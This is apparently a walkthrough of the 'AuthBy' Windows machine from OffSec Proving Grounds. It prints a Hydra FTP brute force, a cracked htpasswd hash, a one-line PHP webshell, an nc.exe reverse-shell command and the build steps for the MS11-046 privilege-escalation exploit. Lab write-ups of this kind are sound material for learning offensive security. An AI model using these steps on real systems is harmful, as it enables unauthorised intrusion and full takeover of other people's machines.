# AuthBy

## Info

AuthBy is an intermediate difficulty windows machine from offsec proving grounds.

## Nmap

All tcp port scan.

```
21/tcp   open  ftp                syn-ack ttl 125 zFTPServer 6.0 build 2011-10-17
242/tcp  open  http               syn-ack ttl 125 Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
3145/tcp open  zftp-admin         syn-ack ttl 125 zFTPServer admin
3389/tcp open  ssl/ms-wbt-server? syn-ack ttl 125
```

## FTP

Anonymous login enabled, files are owned by root so cannot be accessed.

Brute force default ftp usernames and passwords.

```
hydra -L ftp-usernames.txt -P ftp-passwords.txt <ip> ftp
```

The following credentials allow access.

```
admin:admin
```

The following files are found.

```
index.php
.htpasswd
.htaccess
```

## Password

The following hash is found in the .htpasswd file.

```
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

Cracking with hashcat.

```
sudo hashcat --force -m 1600 offsec.hash /usr/share/wordlists/rockyou.txt
```

Credentials.

```
offsec:elite
```

## User

After scanning directories with the credentials and basic authorization, I do not find anything interesting.

As the ftp directory only included http related files, I uploaded a text file to check if it could be accessed in the web directory, which was true.

Creating a basic webshell.

```
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

This allows code execution.


## Root

After uploading nc to the server, we can execute with the webshell.

```
nc.exe <ip> <port> -e cmd
```

windows server is vulnerable to MS11-046.

```
windows_x86/local/40564.c
```

Compile on kali.

```
sudo apt install mingw-w64
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
```

After uploading to the server and executing, the user is nt authority system.
